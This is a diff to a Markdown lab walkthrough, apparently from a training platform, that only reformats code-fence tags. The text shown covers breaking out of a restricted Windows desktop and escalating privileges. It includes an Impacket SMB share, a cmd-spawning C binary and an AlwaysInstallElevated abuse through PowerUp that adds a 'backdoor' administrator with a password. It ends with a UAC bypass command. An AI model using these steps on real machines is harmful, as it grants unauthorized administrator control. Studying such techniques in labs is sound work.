@@ -55,8 +55,7 @@ Having restrictions set, File Explorer does not allow direct access to SMB share
 
 Start a SMB server from the Ubuntu machine using Impacket's `smbserver.py` script.
 
-```
-        shellsession
+```shellsession
 root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -78,8 +77,7 @@ Due to the presence of restrictions within the File Explorer, direct file copyin
 
 The executable `pwn.exe` is a custom compiled binary from `pwn.c` file which upon execution opens up the cmd.
 
-```
-        c
+```c
 #include <stdlib.h>
 int main() {
   system("C:\\Windows\\System32\\cmd.exe");
@@ -152,8 +150,7 @@ Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.micros
 
 We can also validate this using the Command Prompt by querying the corresponding registry keys:
 
-```
-        cmd
+```bat
 C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
@@ -167,8 +164,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
 
 Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.
 
-```
-        powershell
+```powershell
 PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
 PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
     
@@ -183,8 +179,7 @@ Now we can execute `UserAdd.msi` and create a new user `backdoor:T3st@123` under
 
 Back in CMD execute `runas` to start command prompt as the newly created `backdoor` user.
 
-```
-        cmd
+```bat
 C:\> runas /user:backdoor cmd
 
 Enter the password for backdoor: T3st@123
@@ -197,8 +192,7 @@ Attempting to start cmd as user "VDESKTOP3\backdoor" ...
 
 Even though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.
 
-```
-        cmd
+```bat
 C:\Windows\system32> cd C:\Users\Administrator
 
 Access is denied.
@@ -206,8 +200,7 @@ Access is denied.
 
 Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.
 
-```
-        powershell
+```powershell
 PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
 PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
 ```
